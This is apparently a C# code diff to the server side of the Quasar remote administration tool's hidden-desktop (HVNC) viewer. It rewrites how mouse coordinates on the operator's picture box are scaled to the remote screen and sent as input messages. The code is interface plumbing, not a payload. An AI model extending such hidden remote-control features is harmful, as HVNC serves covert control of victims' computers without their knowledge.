@@ -1,4 +1,5 @@
 ﻿using Quasar.Common.Messages.Monitoring.HVNC;
+using Quasar.Server.Messages;
 using Quasar.Server.Networking;
 using Quasar.Server.Utilities;
 using System;
@@ -209,66 +210,25 @@ namespace Quasar.Server.Controls
             _frameCounter.Update(deltaTime);
         }
 
-        private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
-        {
-            if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
-            {
-                return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
-            }
-            else if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
-            {
-                return pictureBox.ClientRectangle;
-            }
-            else
-            {
-                float zoomFactor = Math.Min(
-                    (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
-                    (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);
-
-                int imageWidth = (int)(pictureBox.Image.Width * zoomFactor);
-                int imageHeight = (int)(pictureBox.Image.Height * zoomFactor);
-
-                int imageX = (pictureBox.ClientSize.Width - imageWidth) / 2;
-                int imageY = (pictureBox.ClientSize.Height - imageHeight) / 2;
-
-                return new Rectangle(imageX, imageY, imageWidth, imageHeight);
-            }
-        }
-
-        private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
-        {
-            // Calculate the zoom factor
-            float zoomFactor = Math.Min(
-                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
-                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);
-
-            // Get the displayed rectangle of the image
-            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);
-
-            // Offset and unzoom the coordinates
-            int translatedX = (int)((scaledPoint.X - displayedRect.X) / zoomFactor);
-            int translatedY = (int)((scaledPoint.Y - displayedRect.Y) / zoomFactor);
-
-            return new Point(translatedX, translatedY);
-        }
-
-
         [DllImport("user32.dll")]
         public static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, out uint lpChar, uint uFlags);
-        public Point TranslateCoordinates(Point originalCoords, Size originalScreenSize, PictureBox targetControl)
+
+        private Point TranslateCoordinates(Point originalCoords, PictureBox pictureBox)
         {
-            // Calculate the scaling factors
-            float scaleX = (float)targetControl.Image.Width / originalScreenSize.Width;
-            float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;
+            if (pictureBox.Image == null)
+                return originalCoords;
 
-            // Apply the scaling factors
-            int scaledX = (int)(originalCoords.X * scaleX);
-            int scaledY = (int)(originalCoords.Y * scaleY);
+            Rectangle clientRect = pictureBox.ClientRectangle;
 
-            // Get the unzoomed and offset-adjusted coordinates
-            Point translatedCoords = UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));
+            Size resolution = HVNCHandler.resolution;
 
-            return translatedCoords;
+            float scaleX = (float)resolution.Width / clientRect.Width;
+            float scaleY = (float)resolution.Height / clientRect.Height;
+
+            int remoteX = (int)(originalCoords.X * scaleX);
+            int remoteY = (int)(originalCoords.Y * scaleY);
+
+            return new Point(remoteX, remoteY);
         }
 
         public static bool IsAlphaNumeric(char c)
@@ -310,8 +270,6 @@ namespace Quasar.Server.Controls
                 return;
             }
 
-            Debug.WriteLine("Sending input");
-
             switch (m.Msg)
             {
                 case 0x0201: // WM_LBUTTONDOWN
@@ -327,11 +285,12 @@ namespace Quasar.Server.Controls
                 case 0x020A: // WM_MOUSEWHEEL
                     int x = (int)(m.LParam.ToInt32() & 0xFFFF);
                     int y = (int)((m.LParam.ToInt32() >> 16) & 0xFFFF);
-                    Point newpoint = TranslateCoordinates(new Point(x, y), this.Image.Size, this);
-                    x = newpoint.X;
-                    y = newpoint.Y;
 
-                    m.LParam = (IntPtr)((y << 16) | (x & 0xFFFF));
+                    // Get coordinates in original image space
+                    Point newpoint = TranslateCoordinates(new Point(x, y), this);
+
+                    // Create new LParam with translated coordinates
+                    m.LParam = (IntPtr)((newpoint.Y << 16) | (newpoint.X & 0xFFFF));
 
                     uint msg = (uint)m.Msg;
                     IntPtr wParam = m.WParam;
@@ -339,6 +298,7 @@ namespace Quasar.Server.Controls
                     int Imsg = (int)msg;
                     int IwParam = (int)wParam;
                     int IlParam = (int)lParam;
+
                     Task.Run(async () =>
                     {
                         client.Send(new DoHVNCInput { msg = msg, wParam = IwParam, lParam = IlParam });
